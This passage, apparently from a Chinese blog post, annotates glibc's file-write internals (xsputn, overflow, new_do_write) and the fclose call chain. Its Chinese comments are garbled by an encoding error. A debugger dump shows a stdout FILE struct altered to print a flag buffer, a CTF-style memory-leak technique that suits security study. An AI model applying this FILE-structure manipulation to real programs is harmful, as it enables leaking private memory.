å¦‚æœæ˜¯,åˆ™éœ€è¦åˆ·æ–°ç¼“å†²åŒº(ä¹Ÿå°±æ˜¯å†™å…¥åˆ°æ–‡ä»¶)</span></span><br><span class="line">    <span class="comment">//2.å†™å…¥é‡å¾ˆå¤§,è¶…è¿‡äº†ç¼“å†²åŒºå‰©ä½™æ•°é‡</span></span><br><span class="line">    	<span class="comment">//2.1é¦–å…ˆæŠŠç°æœ‰çš„ç¼“å†²åŒºå†™å…¥åˆ°æ–‡ä»¶,ç¼“å†²åŒºå¤ä½,çœ‹çœ‹èƒ½å¦å®¹çº³å†™å…¥é‡</span></span><br><span class="line">    	<span class="comment">//2.2å¦‚æœè¿˜å®¹çº³ä¸äº†,åˆ™ç›´æ¥syscall</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//å¦‚æœæ²¡å¼€å¯è¡Œç¼“å†²,(ä¹Ÿå°±æ˜¯must_flush=0),å¹¶ä¸”å†™å…¥é‡æ¯”è¾ƒå°å·²ç»æ”¾åˆ°äº†ç¼“å†²åŒº,é‚£ä¹ˆå¯ä»¥è¿”å›äº†,ä¸èµ°ä¸‹é¢çš„ä¸šåŠ¡,ç›´æ¥return</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//å¯¹äºè¡Œç¼“å†²éœ€è¦åˆ·æ–°ç¼“å†²åŒº,æˆ–è€…å†™å…¥é‡å¤ªå¤§æ—¶é¦–å…ˆå°è¯•ç¼“å†²åŒºå¤ä½, å¤„ç†æ–¹å¼æ˜¯ä¸€æ ·çš„,é¦–å…ˆéƒ½åˆ·æ–°ç¼“å†²åŒº</span></span><br><span class="line">    <span class="comment">//æ¥ä¸‹æ¥åˆ¤æ–­ä¸€ä¸‹to_doçœ‹çœ‹è¿˜æœ‰æ²¡æœ‰éœ€è¦å†™å…¥çš„,å¯¹äºå·²å®Œæˆçš„è¡Œç¼“å†²æƒ…å†µå¯ä»¥è¿”å›äº†</span></span><br><span class="line">    <span class="comment">//å¯¹äºå†™å…¥é‡å¤§çš„æƒ…å†µ,å¦‚æœåˆ·æ–°äº†ç¼“å†²åŒºä¹‹å,to_doè¿˜æ˜¯å¤§äºç¼“å†²åŒºå¤§å°,åˆ™ç›´æ¥syscall</span></span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)		<span class="comment">//å¦‚æœè¿˜æœ‰to_doåˆ™è¡¨æ˜count&lt;to_do</span></span><br><span class="line">      								<span class="comment">//å¦‚æœæœ‰must_flushè¯´æ˜è¡Œç¼“å†²éœ€è¦åˆ·æ–°ç¼“å†²åŒº</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)			<span class="comment">//åˆ·æ–°ç¼“å†²åŒº,å°†ç¼“å†²åŒºå†™å…¥æ–‡ä»¶,è°ƒæ•´æ–‡ä»¶æŒ‡é’ˆ,å¦‚æœå·²ç»åˆ°è¾¾æ–‡ä»¶æœ«å°¾åˆ™è¿”å›EOF</span></span><br><span class="line">	<span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">	   caller that everything has been written.  */</span></span><br><span class="line">	<span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line">      <span class="comment">//å¦‚æœæ–‡ä»¶å†™æ»¡äº†,ä¹Ÿå°±æ˜¯EOFäº†,å¦‚æœæ­¤æ—¶to_doä¸º0,å¯¹åº”å·²ç»æ»¡è¶³çš„è¡Œç¼“å†²,è¿”å›EOF. </span></span><br><span class="line">      <span class="comment">//å¯¹äºæœªæ»¡è¶³çš„å¤§é‡å†™å…¥,è¿”å›å·²ç»å†™å…¥çš„å­—èŠ‚æ•°n-to_do</span></span><br><span class="line">	  </span><br><span class="line">      </span><br><span class="line">	</span><br><span class="line">      <span class="comment">//å¦‚æœæ§åˆ¶æµåˆ°è¿™å„¿äº†,è¯´æ˜èµ·ç æ²¡æœ‰EOF</span></span><br><span class="line">      <span class="comment">//è¦ä¹ˆæ˜¯å·²ç»åˆ·æ–°äº†ç¼“å†²åŒºçš„è¡Œç¼“å†²æƒ…å†µ,è¦ä¹ˆæ˜¯æœªæ»¡è¶³çš„å¤§é‡å†™å…¥è¯·æ±‚</span></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;		<span class="comment">//block_sizeå¤§å°æ˜¯ç¼“å†²åŒºå¤§å°</span></span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line">      <span class="comment">//å¦‚æœblock_size&gt;=128,åˆ™do_write = to_do - (to_do % block_size)</span></span><br><span class="line">      <span class="comment">//to_doå¤§å°å¯èƒ½æ˜¯è‹¥å¹²ä¸ªæ•´å—æœ€åæ˜¯ä¸€ä¸ªä¸æ»¡çš„å—,è¿™ä¸ªä¸æ»¡çš„å—å¤§å°å°±æ˜¯(to_do % block_size)</span></span><br><span class="line">      <span class="comment">//è¿™æ ·ç®—å®Œä¹‹å,do_writeå°±æ˜¯è‹¥å¹²æ•´å— , ä¸åŒ…æ‹¬æœ€åçš„ä¸æ»¡å—</span></span><br><span class="line">    	</span><br><span class="line">	  <span class="comment">//å¦åˆ™block_sizeå¤ªå°ä¸è¶³128,æ­¤æ—¶do_writeå°±æ˜¯to_do</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_write)					<span class="comment">//å¦‚æœæœ‰do_write,ä¸‹é¢å°±è¦å®é™…å†™å…¥äº†</span></span><br><span class="line">	&#123;</span><br><span class="line">	  count = new_do_write (f, s, do_write);	</span><br><span class="line">	  to_do -= count;			<span class="comment">//æ­¤æ—¶çš„to_doå¯èƒ½æ˜¯ä¸æ»¡å—å‰©ä¸‹çš„,æˆ–è€…new_do_writeæ²¡æœ‰å†™å®Œå‰©ä¸‹çš„</span></span><br><span class="line">	  <span class="keyword">if</span> (count &lt; do_write)		<span class="comment">//å¦‚æœå®é™…ä¸Šå†™å…¥çš„ä¸è¶³do_write,è¯´æ˜new_do_writeæ²¡æœ‰å®Œæˆä»»åŠ¡,è¦ä¹ˆæ˜¯EOF,å°½åŠ›äº†,è¿”å›å®é™…è¯»äº†å¤šå°‘</span></span><br><span class="line">	    <span class="keyword">return</span> n - to_do;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment">	 buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment">	 so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)				<span class="comment">//å¦‚æœåˆ°è¿™é‡Œè¿˜æœ‰to_do,è¯´æ˜æ˜¯æœ€åé‚£ä¸ªä¸æ»¡å—,</span></span><br><span class="line">	to_do -= _IO_default_xsputn (f, s+do_write, to_do);	</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p><code>_IO_OVERFLOW</code>è¿™ä¸ªå®å®é™…ä¸Šä¹Ÿæ˜¯è°ƒç”¨vtable[overflow]å‡½æ•°å®ç°çš„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_overflow (FILE *f, <span class="type">int</span> ch)				<span class="comment">//if (_IO_OVERFLOW (f, EOF) == EOF)</span></span><br><span class="line">&#123;<span class="comment">//chæ˜¯ç»“æŸå­—ç¬¦,å¦‚æœæ˜¯EOFåˆ™ä¸é™„åŠ åœ¨æœ«å°¾,å¦åˆ™æ¯”å¦‚&#x27;\n&#x27;ä¼šé™„åŠ åœ¨æœ«å°¾</span></span><br><span class="line">    <span class="comment">//å¦‚æœæ‰“å¼€æ ‡å¿—æ˜¯&quot;r&quot;,ä¹Ÿå°±æ˜¯åªè¯»,é‚£ä¹ˆä¼šåœ¨_IO_new_file_fopenä¸­è®¾ç½®_IO_NO_WRITESæ ‡å¿—,è¡¨æ˜åªè¯»æ‰“å¼€</span></span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span><span class="comment">//overflowçš„ä½œç”¨æ˜¯å°†ç¼“å†²åŒºå†™å…¥æ–‡ä»¶,æ˜¾ç„¶å¯¹äºåªè¯»æ–‡ä»¶ä¸èƒ½å†™</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;<span class="comment">//å¦‚æœæ–‡ä»¶æµfå½“å‰ä¸ä¸ä¸å¤„äºå¾€æ–‡ä»¶å†™å…¥çš„çŠ¶æ€, æˆ–è€…æ–‡ä»¶æµfæ²¡æœ‰write_buf</span></span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)	<span class="comment">//å¯¹äºæ²¡æœ‰write_bufçš„æƒ…å†µåˆ™ç»™fåˆ†é…ä¸€ä¸ª</span></span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_doallocbuf (f);			<span class="comment">//ç”³è¯·ä¸€ä¸ª0x1000å­—èŠ‚çš„write_bufç»™f</span></span><br><span class="line">	  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);	<span class="comment">//è®¾ç½®write_bufå’Œbufç›¸åŒ</span></span><br><span class="line">	&#125;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">	 logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">	 read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">	 makes room for subsequent output.</span></span><br><span class="line"><span class="comment">	 Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">	 alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))	</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">	  _IO_free_backup_area (f);</span><br><span class="line">	  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">				   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">	  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      	<span class="comment">//åˆå§‹åŒ–æŒ‡é’ˆ</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">			f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">//è¿™é‡Œå®é™…ä¸Šæ˜¯f-&gt;_IO_write_ptr = f-&gt;_IO_buf_base ä½†æ˜¯å®é™…ä¸Šf-&gt;_IO_read_pträ¹Ÿæ˜¯è¿™ä¸ªå€¼,å› æ­¤æ— æ‰€è°“äº†</span></span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line">		<span class="comment">//æ ‡è®°æ­£åœ¨å¾€æ–‡ä»¶å†™å…¥</span></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">	f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)			<span class="comment">//å¦‚æœchä¸ºEOFåˆ™å°†ç›®å‰çš„ç¼“å†²åŒºå…ˆå†™å…¥æ–‡ä»¶ç„¶åå°±è¿”å›äº†</span></span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,<span class="comment">//_IO_do_writeä¼šå¤ä½ç¼“å†²åŒº</span></span><br><span class="line">			 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">//å¦‚æœwritebufæ»¡äº†</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)	<span class="comment">//ä¹Ÿæ˜¯å…ˆæŠŠç›®å‰ç¼“å†²åŒºå†™å…¥æ–‡ä»¶,å®é™…ä¸Šè°ƒç”¨çš„æ˜¯_IO_do_write,ä¹Ÿä¼šå¤ä½ç¼“å†²åŒº </span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;			<span class="comment">//æœ€åè¡¥ä¸Šä¸€ä¸ªchå­—ç¬¦</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)	<span class="comment">//å¦‚æœä¸ç¼“å†²æˆ–è€…è¡Œç¼“å†²å¹¶ä¸”æœ‰\n</span></span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,<span class="comment">//ç¼“å†²åŒºå†™å…¥æ–‡ä»¶,ç„¶åç¼“å†²åŒºå¤ä½</span></span><br><span class="line">		      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)<span class="comment">//å¦‚æœæœ€åå‰©ä¸‹çš„å—æ¯”å½“æ—¶çš„ç¼“å†²åŒºå¤§,è¿˜æ˜¯ä¼šé€ æˆæ–‡ä»¶ioçš„</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span></span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span>			<span class="comment">//count = new_do_write (f, s, do_write);</span></span><br><span class="line">&#123;	</span><br><span class="line">  <span class="type">size_t</span> count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos</span><br><span class="line">	= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);	<span class="comment">//è°ƒæ•´æ–‡ä»¶æŒ‡é’ˆ</span></span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);		<span class="comment">//å®é™…å†™,countæ˜¯å®é™…å†™å…¥çš„å­—èŠ‚æ•°</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);<span class="comment">//read_bufç¼“å†²åŒºå‚ç…§bufå¤ä½</span></span><br><span class="line">    </span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;	<span class="comment">//write_bufå¤ä½</span></span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">		       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">		       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_default_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">char</span> *) data;</span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="keyword">if</span> (more &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Space available. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)</span><br><span class="line">	&#123;<span class="comment">//å¦‚æœç¼“å†²åŒºæœ‰ç©º</span></span><br><span class="line">	  <span class="type">size_t</span> count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">	  <span class="keyword">if</span> (count &gt; more)<span class="comment">//å¦‚æœç¼“å†²åŒºç©ºåœ°å¤Ÿå¤§</span></span><br><span class="line">	    count = more;</span><br><span class="line">          <span class="comment">//åˆ°è¿™é‡Œæ—¶,count&lt;=more</span></span><br><span class="line">	  <span class="keyword">if</span> (count &gt; <span class="number">20</span>)<span class="comment">//è¦ä¹ˆmempcpyå®ç°æ‹·è´,è¦ä¹ˆå¾ªç¯å®ç°</span></span><br><span class="line">	    &#123;</span><br><span class="line">	      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">	      s += count;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">else</span> <span class="keyword">if</span> (count)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">char</span> *p = f-&gt;_IO_write_ptr;</span><br><span class="line">	      <span class="type">ssize_t</span> i;</span><br><span class="line">	      <span class="keyword">for</span> (i = count; --i &gt;= <span class="number">0</span>; )</span><br><span class="line">		*p++ = *s++;</span><br><span class="line">	      f-&gt;_IO_write_ptr = p;</span><br><span class="line">	    &#125;</span><br><span class="line">	  more -= count;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || _IO_OVERFLOW (f, (<span class="type">unsigned</span> <span class="type">char</span>) *s++) == EOF)</span><br><span class="line">          <span class="comment">//å¦‚æœmore=0åˆ™ä¸ä¼šæ‰§è¡Œåå¥,æ­¤æ—¶æœ€åçš„å‰©ä½™å—ä¹Ÿæ”¾åˆ°äº†ç¼“å†²åŒº,ä¸éœ€è¦è…¾ç©ºäº†</span></span><br><span class="line">          <span class="comment">//å¦åˆ™more&gt;0è¡¨æ˜è¿˜æœ‰å‰©ä¸‹çš„,ä½†æ˜¯ç¼“å†²åŒºæ­¤æ—¶æ»¡äº†,éœ€è¦ç¼“å†²åŒºå†™å…¥æ–‡ä»¶,ç„¶åç¼“å†²åŒºå¤ä½</span></span><br><span class="line">          <span class="comment">//ç„¶åé‡æ–°æŠŠå‰©ä¸‹çš„æ”¾åˆ°ç¼“å†²åŒºä¸­</span></span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">      more--;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *f</span><br><span class="line">$<span class="number">4</span> = &#123;</span><br><span class="line">  _flags = <span class="number">2048</span>,</span><br><span class="line">  _IO_read_ptr = <span class="number">0x0</span>,</span><br><span class="line">  _IO_read_end = <span class="number">0x404038</span> &lt;flag&gt; <span class="string">&quot;flag&#123;secret&#125;&quot;</span>,</span><br><span class="line">  _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_write_base = <span class="number">0x404038</span> &lt;flag&gt; <span class="string">&quot;flag&#123;secret&#125;&quot;</span>,</span><br><span class="line">  _IO_write_ptr = <span class="number">0x405038</span> &lt;error: Cannot access memory at address <span class="number">0x405038</span>&gt;,</span><br><span class="line">  _IO_write_end = <span class="number">0x0</span>,</span><br><span class="line">  _IO_buf_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_buf_end = <span class="number">0x0</span>,</span><br><span class="line">  _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_backup_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_save_end = <span class="number">0x0</span>,</span><br><span class="line">  _markers = <span class="number">0x0</span>,</span><br><span class="line">  _chain = <span class="number">0x0</span>,</span><br><span class="line">  _fileno = <span class="number">1</span>,</span><br><span class="line">  _flags2 = <span class="number">0</span>,</span><br><span class="line">  _old_offset = <span class="number">0</span>,</span><br><span class="line">  _cur_column = <span class="number">0</span>,</span><br><span class="line">  _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>,</span><br><span class="line">  _shortbuf = <span class="string">&quot;&quot;</span>,</span><br><span class="line">  _lock = <span class="number">0x1458790</span>,</span><br><span class="line">  _offset = <span class="number">-1</span>,</span><br><span class="line">  _codecvt = <span class="number">0x0</span>,</span><br><span class="line">  _wide_data = <span class="number">0x14587a0</span>,</span><br><span class="line">  _freeres_list = <span class="number">0x0</span>,</span><br><span class="line">  _freeres_buf = <span class="number">0x0</span>,</span><br><span class="line">  __pad5 = <span class="number">0</span>,</span><br><span class="line">  _mode = <span class="number">-1</span>,</span><br><span class="line">  _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">flose(_IO_new_fclose@glibc-2.23/libio/iofclose.c:38)</span><br><span class="line">	-&gt;_IO_un_link@glibc-2.23/libio/genops.c:58</span><br><span class="line">		//ä»_IO_list_allä¸ºé¦–çš„å•å‘é“¾è¡¨ä¸Šéå†æ‰¾åˆ°å¹¶æ‹†ä¸‹è¿™ä¸ª_IO_FILE_plus,</span><br><span class="line">	-&gt;_IO_file_close_it@glibc-2.23/libio/fileops.c:157</span><br><span class="line">		-&gt;_IO_do_flush			//ç¼“å†²åŒºè¿˜æœ‰ä¸œè¥¿æ²¡æ‰“å°å‡ºæ¥,éƒ½ç»™æ‰“å‡ºæ¥</span><br><span class="line">			-&gt;_IO_do_write</span><br><span class="line">				-&gt;new_do_write</span><br><span class="line">					-&gt;vtable.__write</span><br><span class="line">						-&gt;write(linux api)</span><br><span class="line">						</span><br><span class="line">		-&gt;_IO_un_link	//è¿™ä¸€æ¬¡é‡å¤è°ƒç”¨å¥½åƒæ˜¯å¤šä½™çš„,å¯èƒ½é˜²æ­¢ä¹‹å‰æœ‰ä»€ä¹ˆå·®é”™?</span><br><span class="line">	-&gt;vtable.__finish(_IO_new_file_finish)</span><br><span class="line">		-&gt;_IO_do_flush	//ç¬¬äºŒæ¬¡è°ƒç”¨</span><br><span class="line">			...</span><br><span class="line">		-&gt;__close</span><br><span class="line">			-&gt;_IO_file_close_it	//ç¬¬äºŒæ¬¡è°ƒç”¨</span><br><span class="line">		-&gt;_IO_default_finish</span><br><span class="line">			-&gt;free	